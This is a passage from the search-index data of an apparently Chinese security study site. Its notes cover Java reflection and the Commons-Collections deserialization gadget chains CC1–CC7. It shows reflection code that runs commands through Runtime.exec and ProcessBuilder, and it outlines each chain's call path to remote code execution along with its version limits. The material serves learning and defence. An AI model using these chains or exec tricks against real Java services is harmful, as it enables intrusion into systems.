\uff0c\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6","title":"\u83b7\u53d6\u7c7b\u7684\u4e09\u4e2a\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%871/#classforname\u7684\u51fd\u6570\u91cd\u8f7d","text":"forName\u6709\u4e24\u4e2a\u51fd\u6570\u91cd\u8f7d\uff1a - Class<?> forName(String name) - Class<?> forName(String name, **boolean** initialize, ClassLoader loader) \u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u5f0f\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u7684\u4e00\u4e2a\u5c01\u88c5\uff0c\u5b83\u76f8\u5f53\u4e8e Class.forName(className, true, currentLoader) \u5176\u4e2d\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u662f\u5426\u521d\u59cb\u5316\uff0c\u4f46\u662f\u8fd9\u91cc\u7684\u521d\u59cb\u5316\u4e0d\u662f\u6307\u5b9e\u4f8b\u7684\u521d\u59cb\u5316(\u8c03\u7528\u6784\u9020\u51fd\u6570)\uff0c\u800c\u662f\u7c7b\u7684\u521d\u59cb\u5316","title":"Class.forname\u7684\u51fd\u6570\u91cd\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%871/#\u7c7b\u4e2d\u4e09\u4e2a\u521d\u59cb\u5316\u7684\u533a\u522b","text":"class Test { { System . out . println ( \"static code\" ); } static { System . out . println ( \"init top.longlone.Test class\" ); } public Test () { System . out . println ( \"init instance\" ); } } \u8fd9\u91cc\u6709\u4e09\u4e2a\u521d\u59cb\u5316\u4ee3\u7801\uff0c\u5b83\u4eec\u7684\u533a\u522b\u662f \u7b2c\u4e00\u4e2a {} \u4e2d\u7684\u4ee3\u7801\u4f1a\u653e\u5728\u6784\u9020\u51fd\u6570\u7684super() \u540e\u9762\uff0c \u4f46\u5728\u6784\u9020\u51fd\u6570\u5185\u5bb9\u7684\u524d\u9762 \u7b2c\u4e8c\u4e2a static {} \u4e2d\u7684\u4ee3\u7801\u662f\u7c7b\u7684\u521d\u59cb\u5316\u65f6\u7684\u4ee3\u7801 \u7b2c\u4e09\u4e2a\u6784\u9020\u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u662f\u5b9e\u4f8b\u521d\u59cb\u5316\u65f6\u7684\u4ee3\u7801 \u6240\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u63cf\u8ff0\uff0c\u5b83\u4eec\u7684\u6267\u884c\u987a\u5e8f\u4f1a\u662f2->1->3\uff0c\u6839\u636e\u8fd9\u4e2a\u6211\u4eec\u4e5f\u77e5\u9053\u4e86 forname() \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570initialize\u4ee3\u8868\u7684\u5c31\u662f\u662f\u5426\u6267\u884c static {} \u4e2d\u7684\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5199\u6bb5\u4ee3\u7801\u6d4b\u8bd5\u4e00\u4e0b package top.longlone ; class Test { { System . out . println ( \"static code\" ); } static { System . out . println ( \"init top.longlone.Test class\" ); } public Test () { System . out . println ( \"init instance\" ); } } public class Hello { public static void main ( String [] args ) throws ClassNotFoundException { Class . forName ( \"top.longlone.Test\" , false , Hello . class . getClassLoader ()); // \u4e0d\u4f1a\u6709\u8f93\u51fa Class . forName ( \"top.longlone.Test\" , true , Hello . class . getClassLoader ()); // \u6709\u8f93\u51fa } }","title":"\u7c7b\u4e2d\u4e09\u4e2a\"\u521d\u59cb\u5316\"\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%872/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5c04\u7bc72 # \u5185\u90e8\u7c7b\u4e0e\u53cd\u5c04\u8c03\u7528 # \u5728java\u4e2d\u8981\u901a\u8fc7 forname() \u83b7\u53d6\u5185\u90e8\u7c7b\uff0c\u9700\u8981\u7528\u5230$\u7b26\u53f7\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b package top.longlone ; import java.lang.reflect.Constructor ; public class Hello { class InnerClass { public void print () { System . out . println ( \"here is InnerClass\" ); } public InnerClass () { } } public static void main ( String [] args ) throws Exception { Class <?> innerClass = Class . forName ( \"top.longlone.Hello$InnerClass\" ); Constructor <?> constructor = innerClass . getConstructor ( Hello . class ); Object o = constructor . newInstance ( Hello . class . newInstance ()); System . out . println ( o ); } } newInstance\u4e4b\u75db # \u6709\u65f6\u5019\u6211\u4eec\u8c03\u7528 newInstance() \u603b\u662f\u4e0d\u6210\u529f\uff0c\u539f\u56e0\u53ef\u80fd\u6709\u5982\u4e0b2\u4e2a: - \u7c7b\u6ca1\u6709\u65e0\u53c2\u6784\u9020\u65b9\u6cd5 - \u6784\u9020\u65b9\u6cd5\u662f\u79c1\u6709\u7684 \u4e00\u4e2a\u5e38\u89c1\u7684\u4f8b\u5b50\u5c31\u662f java.lang.Runtime \uff0c\u6bd4\u5982 Class clazz = Class . forName ( \"java.lang.Runtime\" ); clazz . getMethod ( \"exec\" , String . class ). invoke ( clazz . newInstance (), \"id\" ); \u8fd9\u65f6\u5019\u4f1a\u4ea7\u751f\u62a5\u9519\uff0c\u56e0\u4e3a Runtime \u7684\u7c7b\u6784\u9020\u65b9\u6cd5\u662f\u79c1\u6709\u7684\uff0c\u8fd9\u91cc\u6d89\u53ca\u5230\u4e00\u4e2a\u8bbe\u8ba1\u6a21\u5f0f: \u5355\u4f8b\u6a21\u5f0f \u5355\u4f8b\u6a21\u5f0f\u662f\u4e3a\u4e86\u786e\u4fdd\u8bbf\u95ee\u5bf9\u8c61\u7684\u552f\u4e00\u6027\uff0c\u53ea\u9700\u8981\u5b9e\u4f8b\u5316\u4e00\u6b21\uff0c\u4e4b\u540e\u4e0d\u9700\u8981\u6216\u4e0d\u5e0c\u671b\u5176\u518d\u5b9e\u4f8b\u5316\uff0c\u5e38\u89c1\u7528\u4e8e\u6570\u636e\u5e93\u8fde\u63a5(\u53ea\u8fde\u63a5\u4e00\u6b21\u6570\u636e\u5e93\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21\u90fd\u8fde\u63a5)\u3002 \u4f7f\u7528\u5355\u4f8b\u6a21\u5f0f\u7684\u7c7b\u4e00\u822c\u4f1a\u63d0\u4f9b\u4e00\u4e2a getXXX() \u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u552f\u4e00\u7684\u5b9e\u4f8b\uff0c\u5728 java.lang.Runtime \u4e2d\u8fd9\u4e2a\u65b9\u6cd5\u662f getRuntime() \u6240\u4ee5\u4e0a\u8ff0\u7684\u4ee3\u7801\u6211\u4eec\u5e94\u8be5\u6539\u4e3a Class clazz = Class . forName ( \"java.lang.Runtime\" ); clazz . getMethod ( \"exec\" , String . class ). invoke ( clazz . getMethod ( \"getRuntime\" ). invoke ( clazz ), \"calc.exe\" ); getMethod\u4e0e\u51fd\u6570\u91cd\u8f7d # getMethod\u7684\u4f5c\u7528\u662f\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6\u4e00\u4e2a\u7c7b\u7684\u67d0\u4e2a\u7279\u5b9a\u7684\u516c\u6709\u65b9\u6cd5\u3002\u800cJava\u4e2d\u652f\u6301\u65b9\u6cd5\u91cd\u8f7d\uff0c\u6211\u4eec\u4e0d\u80fd\u4ec5\u901a\u8fc7\u51fd\u6570\u540d\u6765\u786e\u5b9a\u4e00\u4e2a\u51fd\u6570\u3002\u6240\u4ee5\uff0c\u5728\u8c03\u7528getMethod\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u4f20\u5165\u9700\u8981\u83b7\u53d6\u7684\u51fd\u6570\u7684\u53c2\u6570\u7c7b\u578b\u5217\u8868\u3002 \u4ee5Runtime.exec\u4e3a\u4f8b\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u67096\u4e2a\u91cd\u8f7d \u6240\u4ee5\u6211\u4eec\u5982\u679c\u8981\u62ff\u5230\u7b2c\u4e00\u4e2a\u91cd\u8f7d\uff0c\u53ef\u4ee5\u901a\u8fc7 clazz . getMethod ( \"exec\" , String . class ) \u5982\u679c\u6211\u4eec\u8981\u62ff\u5230\u7b2c\u4e8c\u4e2a\u91cd\u8f7d\uff0c\u53ef\u4ee5\u901a\u8fc7 clazz . getMethod ( \"exec\" , String [] . class ); \u901a\u8fc7\u53cd\u5c04\u8c03\u7528Runtime.exec # \u793a\u4f8b\u4ee3\u7801\u5982\u4e0b Class clazz = Class . forName ( \"java.lang.Runtime\" ); Method execMethod = clazz . getMethod ( \"exec\" , String . class ); Method getRuntimeMethod = clazz . getMethod ( \"getRuntime\" ); Object runtime = getRuntimeMethod . invoke ( clazz ); execMethod . invoke ( runtime , \"calc.exe\" );","title":"\u53cd\u5c04\u7bc72"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%872/#\u53cd\u5c04\u7bc72","text":"","title":"\u53cd\u5c04\u7bc72"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%872/#\u5185\u90e8\u7c7b\u4e0e\u53cd\u5c04\u8c03\u7528","text":"\u5728java\u4e2d\u8981\u901a\u8fc7 forname() \u83b7\u53d6\u5185\u90e8\u7c7b\uff0c\u9700\u8981\u7528\u5230$\u7b26\u53f7\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b package top.longlone ; import java.lang.reflect.Constructor ; public class Hello { class InnerClass { public void print () { System . out . println ( \"here is InnerClass\" ); } public InnerClass () { } } public static void main ( String [] args ) throws Exception { Class <?> innerClass = Class . forName ( \"top.longlone.Hello$InnerClass\" ); Constructor <?> constructor = innerClass . getConstructor ( Hello . class ); Object o = constructor . newInstance ( Hello . class . newInstance ()); System . out . println ( o ); } }","title":"\u5185\u90e8\u7c7b\u4e0e\u53cd\u5c04\u8c03\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%872/#newinstance\u4e4b\u75db","text":"\u6709\u65f6\u5019\u6211\u4eec\u8c03\u7528 newInstance() \u603b\u662f\u4e0d\u6210\u529f\uff0c\u539f\u56e0\u53ef\u80fd\u6709\u5982\u4e0b2\u4e2a: - \u7c7b\u6ca1\u6709\u65e0\u53c2\u6784\u9020\u65b9\u6cd5 - \u6784\u9020\u65b9\u6cd5\u662f\u79c1\u6709\u7684 \u4e00\u4e2a\u5e38\u89c1\u7684\u4f8b\u5b50\u5c31\u662f java.lang.Runtime \uff0c\u6bd4\u5982 Class clazz = Class . forName ( \"java.lang.Runtime\" ); clazz . getMethod ( \"exec\" , String . class ). invoke ( clazz . newInstance (), \"id\" ); \u8fd9\u65f6\u5019\u4f1a\u4ea7\u751f\u62a5\u9519\uff0c\u56e0\u4e3a Runtime \u7684\u7c7b\u6784\u9020\u65b9\u6cd5\u662f\u79c1\u6709\u7684\uff0c\u8fd9\u91cc\u6d89\u53ca\u5230\u4e00\u4e2a\u8bbe\u8ba1\u6a21\u5f0f: \u5355\u4f8b\u6a21\u5f0f \u5355\u4f8b\u6a21\u5f0f\u662f\u4e3a\u4e86\u786e\u4fdd\u8bbf\u95ee\u5bf9\u8c61\u7684\u552f\u4e00\u6027\uff0c\u53ea\u9700\u8981\u5b9e\u4f8b\u5316\u4e00\u6b21\uff0c\u4e4b\u540e\u4e0d\u9700\u8981\u6216\u4e0d\u5e0c\u671b\u5176\u518d\u5b9e\u4f8b\u5316\uff0c\u5e38\u89c1\u7528\u4e8e\u6570\u636e\u5e93\u8fde\u63a5(\u53ea\u8fde\u63a5\u4e00\u6b21\u6570\u636e\u5e93\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21\u90fd\u8fde\u63a5)\u3002 \u4f7f\u7528\u5355\u4f8b\u6a21\u5f0f\u7684\u7c7b\u4e00\u822c\u4f1a\u63d0\u4f9b\u4e00\u4e2a getXXX() \u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u552f\u4e00\u7684\u5b9e\u4f8b\uff0c\u5728 java.lang.Runtime \u4e2d\u8fd9\u4e2a\u65b9\u6cd5\u662f getRuntime() \u6240\u4ee5\u4e0a\u8ff0\u7684\u4ee3\u7801\u6211\u4eec\u5e94\u8be5\u6539\u4e3a Class clazz = Class . forName ( \"java.lang.Runtime\" ); clazz . getMethod ( \"exec\" , String . class ). invoke ( clazz . getMethod ( \"getRuntime\" ). invoke ( clazz ), \"calc.exe\" );","title":"newInstance\u4e4b\u75db"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%872/#getmethod\u4e0e\u51fd\u6570\u91cd\u8f7d","text":"getMethod\u7684\u4f5c\u7528\u662f\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6\u4e00\u4e2a\u7c7b\u7684\u67d0\u4e2a\u7279\u5b9a\u7684\u516c\u6709\u65b9\u6cd5\u3002\u800cJava\u4e2d\u652f\u6301\u65b9\u6cd5\u91cd\u8f7d\uff0c\u6211\u4eec\u4e0d\u80fd\u4ec5\u901a\u8fc7\u51fd\u6570\u540d\u6765\u786e\u5b9a\u4e00\u4e2a\u51fd\u6570\u3002\u6240\u4ee5\uff0c\u5728\u8c03\u7528getMethod\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u4f20\u5165\u9700\u8981\u83b7\u53d6\u7684\u51fd\u6570\u7684\u53c2\u6570\u7c7b\u578b\u5217\u8868\u3002 \u4ee5Runtime.exec\u4e3a\u4f8b\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u67096\u4e2a\u91cd\u8f7d \u6240\u4ee5\u6211\u4eec\u5982\u679c\u8981\u62ff\u5230\u7b2c\u4e00\u4e2a\u91cd\u8f7d\uff0c\u53ef\u4ee5\u901a\u8fc7 clazz . getMethod ( \"exec\" , String . class ) \u5982\u679c\u6211\u4eec\u8981\u62ff\u5230\u7b2c\u4e8c\u4e2a\u91cd\u8f7d\uff0c\u53ef\u4ee5\u901a\u8fc7 clazz . getMethod ( \"exec\" , String [] . class );","title":"getMethod\u4e0e\u51fd\u6570\u91cd\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%872/#\u901a\u8fc7\u53cd\u5c04\u8c03\u7528runtimeexec","text":"\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b Class clazz = Class . forName ( \"java.lang.Runtime\" ); Method execMethod = clazz . getMethod ( \"exec\" , String . class ); Method getRuntimeMethod = clazz . getMethod ( \"getRuntime\" ); Object runtime = getRuntimeMethod . invoke ( clazz ); execMethod . invoke ( runtime , \"calc.exe\" );","title":"\u901a\u8fc7\u53cd\u5c04\u8c03\u7528Runtime.exec"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%873/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5c04\u7bc73 # \u6ca1\u6709\u65e0\u53c2\u6784\u9020\u65b9\u6cd5\u4e0b\u7684\u53cd\u5c04 # \u4e8b\u5b9e\u4e0a\uff0c\u548c getMethod \u7c7b\u4f3c\uff0c getConstructor \u4e5f\u80fd\u63a5\u53d7\u53c2\u6570\uff0c\u53c2\u6570\u662f\u6784\u9020\u51fd\u6570\u5217\u8868\u7c7b\u578b\uff0c\u56e0\u4e3a\u6784\u9020\u51fd\u6570\u4e5f\u652f\u6301\u91cd\u8f7d\uff0c \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528\u53c2\u6570\u5217\u8868\u7c7b\u578b\u6765\u786e\u5b9a\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002\u83b7\u53d6\u5230\u6784\u9020\u51fd\u6570\u540e\uff0c\u6211\u4eec\u4f7f\u7528 newInstance \u6765\u6267\u884c\u3002 \u4ee5ProcessBuild\u4e3a\u4f8b\uff0c\u5b83\u5b58\u57282\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u6211\u4eec\u4f7f\u7528\u7b2c\u4e00\u4e2a\u91cd\u8f7d: - public ProcessBuilder(List<String> command) - public ProcessBuilder(String... command) Class <?> clazz = Class . forName ( \"java.lang.ProcessBuilder\" ); Object obj = clazz . getConstructor ( List . class ). newInstance ( Arrays . asList ( \"calc.exe\" )); // \u7b2c\u4e00\u4e2a\u91cd\u8f7d // Object obj = clazz.getConstructor(String[].class).newInstance((Object) new String[]{\"calc.exe\"}); // \u7b2c\u4e8c\u4e2a\u91cd\u8f7d Method startMethod = clazz . getMethod ( \"start\" ); startMethod . invoke ( obj ); \u79c1\u6709\u65b9\u6cd5\u7684\u53cd\u5c04 # \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 getXXX \u7cfb\u5217\u65b9\u6cd5\u662f\u65e0\u6cd5\u83b7\u53d6\u7c7b\u4e2d\u7684\u79c1\u6709\u65b9\u6cd5/\u5c5e\u6027\u7684\uff0c\u8fd9\u5176\u5b9e\u6d89\u53ca\u5230\u4e86 getDeclaredXXX \u4e0e getXXX \u7684\u533a\u522b getXXX \u7cfb\u5217\u65b9\u6cd5\u83b7\u53d6\u7684\u662f\u5f53\u524d\u7c7b\u53ca\u5176\u7ee7\u627f\u7c7b\u4e2d\u6240\u6709\u7684\u516c\u5171\u65b9\u6cd5/\u5c5e\u6027 getDeclaredXXX \u7cfb\u5217\u65b9\u6cd5\u83b7\u53d6\u7684\u662f\u5f53\u524d\u7c7b\u4e2d\u6240\u6709\u7684\u65b9\u6cd5/\u5c5e\u6027 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 getDeclaredXXX \u7cfb\u5217\u65b9\u6cd5\u6765\u53bb\u53cd\u5c04\u79c1\u6709\u65b9\u6cd5\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b Class <?> clazz = Class . forName ( \"java.lang.Runtime\" ); Constructor <?> m = clazz . getDeclaredConstructor (); m . setAccessible ( true ); Object obj = m . newInstance (); Method execMethod = clazz . getMethod ( \"exec\" , String . class ); execMethod . invoke ( obj , \"calc.exe\" );","title":"\u53cd\u5c04\u7bc73"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%873/#\u53cd\u5c04\u7bc73","text":"","title":"\u53cd\u5c04\u7bc73"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%873/#\u6ca1\u6709\u65e0\u53c2\u6784\u9020\u65b9\u6cd5\u4e0b\u7684\u53cd\u5c04","text":"\u4e8b\u5b9e\u4e0a\uff0c\u548c getMethod \u7c7b\u4f3c\uff0c getConstructor \u4e5f\u80fd\u63a5\u53d7\u53c2\u6570\uff0c\u53c2\u6570\u662f\u6784\u9020\u51fd\u6570\u5217\u8868\u7c7b\u578b\uff0c\u56e0\u4e3a\u6784\u9020\u51fd\u6570\u4e5f\u652f\u6301\u91cd\u8f7d\uff0c \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528\u53c2\u6570\u5217\u8868\u7c7b\u578b\u6765\u786e\u5b9a\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002\u83b7\u53d6\u5230\u6784\u9020\u51fd\u6570\u540e\uff0c\u6211\u4eec\u4f7f\u7528 newInstance \u6765\u6267\u884c\u3002 \u4ee5ProcessBuild\u4e3a\u4f8b\uff0c\u5b83\u5b58\u57282\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u6211\u4eec\u4f7f\u7528\u7b2c\u4e00\u4e2a\u91cd\u8f7d: - public ProcessBuilder(List<String> command) - public ProcessBuilder(String... command) Class <?> clazz = Class . forName ( \"java.lang.ProcessBuilder\" ); Object obj = clazz . getConstructor ( List . class ). newInstance ( Arrays . asList ( \"calc.exe\" )); // \u7b2c\u4e00\u4e2a\u91cd\u8f7d // Object obj = clazz.getConstructor(String[].class).newInstance((Object) new String[]{\"calc.exe\"}); // \u7b2c\u4e8c\u4e2a\u91cd\u8f7d Method startMethod = clazz . getMethod ( \"start\" ); startMethod . invoke ( obj );","title":"\u6ca1\u6709\u65e0\u53c2\u6784\u9020\u65b9\u6cd5\u4e0b\u7684\u53cd\u5c04"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84%E7%AF%873/#\u79c1\u6709\u65b9\u6cd5\u7684\u53cd\u5c04","text":"\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 getXXX \u7cfb\u5217\u65b9\u6cd5\u662f\u65e0\u6cd5\u83b7\u53d6\u7c7b\u4e2d\u7684\u79c1\u6709\u65b9\u6cd5/\u5c5e\u6027\u7684\uff0c\u8fd9\u5176\u5b9e\u6d89\u53ca\u5230\u4e86 getDeclaredXXX \u4e0e getXXX \u7684\u533a\u522b getXXX \u7cfb\u5217\u65b9\u6cd5\u83b7\u53d6\u7684\u662f\u5f53\u524d\u7c7b\u53ca\u5176\u7ee7\u627f\u7c7b\u4e2d\u6240\u6709\u7684\u516c\u5171\u65b9\u6cd5/\u5c5e\u6027 getDeclaredXXX \u7cfb\u5217\u65b9\u6cd5\u83b7\u53d6\u7684\u662f\u5f53\u524d\u7c7b\u4e2d\u6240\u6709\u7684\u65b9\u6cd5/\u5c5e\u6027 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 getDeclaredXXX \u7cfb\u5217\u65b9\u6cd5\u6765\u53bb\u53cd\u5c04\u79c1\u6709\u65b9\u6cd5\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b Class <?> clazz = Class . forName ( \"java.lang.Runtime\" ); Constructor <?> m = clazz . getDeclaredConstructor (); m . setAccessible ( true ); Object obj = m . newInstance (); Method execMethod = clazz . getMethod ( \"exec\" , String . class ); execMethod . invoke ( obj , \"calc.exe\" );","title":"\u79c1\u6709\u65b9\u6cd5\u7684\u53cd\u5c04"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316CC\u7bc7\u603b\u7ed3 # \u9996\u5148CC\u94fe\u867d\u7136\u5f88\u591a\u6761\uff0c\u4f46\u662f\u57fa\u672c\u4e0a\u90fd\u53ef\u4ee5\u5206\u4e3a\u524d\u6bb5\u548c\u540e\u6bb5\uff0c\u91cd\u8981\u7684\u627f\u4e0a\u542f\u4e0b\u65b9\u6cd5\u662f Transformer.transform CC\u94fe\u7684\u5229\u7528\u6761\u4ef6\u5b58\u5728\u4e00\u4e9b\u9650\u5236\uff0c\u4e3b\u8981\u8868\u73b0\u4e3a: jdk8u71\u4e4b\u524d\u53ef\u4ee5\u4f7f\u7528AnnotationInvocationHandler\u4f5c\u4e3a\u524d\u6bb5\uff0c\u4e4b\u540e\u4e0d\u884c jdk7\u4f4e\u7248\u672c\u4e2d\u65e0\u6cd5\u4f7f\u7528CC5(BadAttributeValueExpException\u4e0d\u5b58\u5728readObject) commons-collections3.x\u53ef\u4ee5\u4f7f\u7528LazyMap.decorate\u4f5c\u4e3a\u524d\u6bb5\uff0c\u4e4b\u540e\u4e0d\u884c commons-collections4.0\u4e4b\u540e\u53ef\u4ee5\u76f4\u63a5\u56de\u8c03PriorityQueue\u4f5c\u4e3a\u524d\u6bb5\uff0c\u4e4b\u524d\u4e0d\u884c \u81ea\u5df1\u5199\u7684\u5de5\u5177-javaGGC # https://github.com/WAY29/javaGGC CC\u94fe\u8c03\u7528\u903b\u8f91 # CC1 # AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce CC2 # PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757 CC3 # AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757 CC4 # PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757 CC5 # BadAttributeValueExpException.readObject() valObj.toString() === TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce CC6 # HashMap.readObject() putForCreate(key) === key.hashCode() === TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce CC7 # Hashtable.readObject() Hashtable.reconstitutionPut() org.apache.commons.collections.map.AbstractMapDecorator.equals() === java.util.AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u53cd\u5e8f\u5217\u5316CC\u7bc7\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#\u53cd\u5e8f\u5217\u5316cc\u7bc7\u603b\u7ed3","text":"\u9996\u5148CC\u94fe\u867d\u7136\u5f88\u591a\u6761\uff0c\u4f46\u662f\u57fa\u672c\u4e0a\u90fd\u53ef\u4ee5\u5206\u4e3a\u524d\u6bb5\u548c\u540e\u6bb5\uff0c\u91cd\u8981\u7684\u627f\u4e0a\u542f\u4e0b\u65b9\u6cd5\u662f Transformer.transform CC\u94fe\u7684\u5229\u7528\u6761\u4ef6\u5b58\u5728\u4e00\u4e9b\u9650\u5236\uff0c\u4e3b\u8981\u8868\u73b0\u4e3a: jdk8u71\u4e4b\u524d\u53ef\u4ee5\u4f7f\u7528AnnotationInvocationHandler\u4f5c\u4e3a\u524d\u6bb5\uff0c\u4e4b\u540e\u4e0d\u884c jdk7\u4f4e\u7248\u672c\u4e2d\u65e0\u6cd5\u4f7f\u7528CC5(BadAttributeValueExpException\u4e0d\u5b58\u5728readObject) commons-collections3.x\u53ef\u4ee5\u4f7f\u7528LazyMap.decorate\u4f5c\u4e3a\u524d\u6bb5\uff0c\u4e4b\u540e\u4e0d\u884c 